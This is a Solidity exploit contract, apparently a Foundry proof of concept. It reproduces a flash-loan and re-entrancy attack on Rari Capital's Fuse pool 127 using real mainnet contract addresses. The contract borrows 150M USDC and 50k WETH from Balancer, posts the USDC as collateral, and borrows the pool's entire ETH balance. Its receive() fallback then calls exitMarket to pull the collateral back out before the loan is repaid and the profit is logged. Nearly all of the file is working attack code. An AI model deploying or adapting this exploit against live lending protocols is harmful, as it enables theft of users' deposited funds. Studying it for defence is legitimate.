// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {IERC20} from "openzeppelin/token/ERC20/IERC20.sol";

interface IUnitroller {
    function enterMarkets(address[] memory cTokens) external payable returns(uint256[] memory);
    function exitMarket(address cToken) external;
    function borrowCaps(address cToken) external view returns(uint256);
}

// Contract address: https://etherscan.io/address/0xEbE0d1cb6A0b8569929e062d67bfbC07608f0A47#code
interface ICERC20Delegator {
    function mint(uint256 mintAmount) external payable returns (uint256);
    function balanceOf(address _of) external view returns(uint256);
    function decimals() external view returns(uint16);
    function borrow(uint256 borrowAmount) external payable returns (uint256);
    function accrueInterest() external;
    function approve(address spender, uint256 amt) external;
    function redeemUnderlying(uint256 redeemAmount) external payable returns (uint256);
}

// Contract address: https://etherscan.io/address/0x26267e41CeCa7C8E0f143554Af707336f27Fa051#code
interface IETHDelegator {
    function mint() external payable;
    function balanceOf(address _of) external view returns(uint256);
    function decimals() external view returns(uint16);
    function borrow(uint256 borrowAmount) external payable returns (uint256);
    function accrueInterest() external;
    function approve(address spender, uint256 amt) external;
    function redeemUnderlying(uint256 redeemAmount) external payable returns (uint256);
    function getCash() external view returns (uint256);
}

interface IVault {
    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}


interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

// Relevant external contracts with interfaces 
contract RelevantContracts {
    // Proxy and storage layer of the Comptroller 
    IUnitroller public constant rariComptroller = IUnitroller(0x3f2D1BC6D02522dbcdb216b2e75eDDdAFE04B16F);

    // fUSDC-127
    ICERC20Delegator public constant fUSDC = ICERC20Delegator(0xEbE0d1cb6A0b8569929e062d67bfbC07608f0A47);

    // fETH-127
    IETHDelegator public constant fETH = IETHDelegator(0x26267e41CeCa7C8E0f143554Af707336f27Fa051);

    // Tokens contract addresses 
    IERC20 public constant usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 public constant weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);   
    
    // balancer contract address
    IVault public constant vault = IVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
}

/**
    * Attacking contract 
 1) Get flashloan for $150M USDC and 50k WETH
 2) Deposit $150M USDC collateral into vulnerable fork version of Compound
 3) Borrow tokens via vulnerable borrowFresh function
 4) Call exitMarket function via fallback function and recover collateral
 5) Repeat steps #2 through #4 against arbitrary tokens
    6) Repay the flashloan and pocket the profits
 */
contract FuseFeiAttack is IFlashLoanRecipient, RelevantContracts {

    // Attack address 
    address attacker = address(this);

    // Initiate flashloan request for $150M USD and 50k ether 
    // Done by triggering the flashLoan and receiveFlashLoan callback
    function fuseFeiAttack() external {

        // Burn all attacker ETH for purposes of demonstrating profits later on 
        payable(address(0)).transfer(attacker.balance);

        // Pre-Attack Attacker Balance 
        console.log("==== Pre-Attack Balances (Burned ETH To Demonstrate Profits) ====");
        logBalancesWithLabel("Attacker", attacker);

        // Declare tokens to flashloan
        IERC20[] memory _tokens = new IERC20[](2);
        _tokens[0] = usdc;
        _tokens[1] = weth;

        // Declare amount to flashloan
        uint256[] memory _amounts = new uint256[](2);
        _amounts[0] = 150_000_000_000_000;
        _amounts[1] = 50_000 ether;

        // Initiate flashloan
        vault.flashLoan(IFlashLoanRecipient(address(this)), _tokens, _amounts, "");
    }


    // Main attack logic 
    // When `flashLoan` is called on the vault by the `testFuseFeiAttack` function, 
    // it invokes the `receiveFlashLoan` hook and executes the code within
    // See: https://etherscan.io/address/0xBA12222222228d8Ba445958a75a0704d566BF2C8#code#F19#L21
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external override {

        // Post-Loan Attacker Balance 
        console.log("==== Post-Loan Balances ====");
        logBalancesWithLabel("Attacker", attacker);

        // Deposit $150M USDC collateral into vulnerable fork version of Compound
        usdc.approve(address(fUSDC), type(uint256).max);
        fUSDC.accrueInterest();
        fUSDC.mint(150_000_000_000_000);

        // Post-Minting Attacker Balance 
        console.log("==== Post-Minting Balances ====");
        logBalancesWithLabel("Attacker", attacker);        
        
        // Enter the borrow market
        address[] memory _cTokens = new address[](1); 
        _cTokens[0] = address(fUSDC);
        rariComptroller.enterMarkets(_cTokens);        

        // Borrow tokens via vulnerable borrowFresh function
        fETH.borrow(address(fETH).balance); 

         // Post-Borrowing Attacker Balance 
        console.log("==== Post-Borrowing Balances ====");
        logBalancesWithLabel("Attacker", attacker);         

        // Redeem underlying and trigger re-entrancy via fallback function
        fUSDC.approve(address(fUSDC), type(uint256).max);
        fUSDC.redeemUnderlying(150_000_000_000_000);

        // Repay the flashloan and pocket the profits
        usdc.transfer(address(vault), 150_000_000_000_000);
        weth.transfer(address(vault), 50_000 ether);

         // Post-Repayment Attacker Balance 
        console.log("==== Post-Repayment Balances (Profit) ====");
        logBalancesWithLabel("Attacker", attacker);
    }

    // Call exitMarket function via fallback function and recover collateral
    receive() external payable {
        rariComptroller.exitMarket(address(fUSDC)); 
    }   

    function logBalancesWithLabel(string memory name, address addr) internal {
        console.log(name);
        console.log("Native Tokens: ", addr.balance);
        console.log("USD Coin: ", usdc.balanceOf(addr));
        console.log("Wrapped Eth: ", weth.balanceOf(addr));
    } 
}
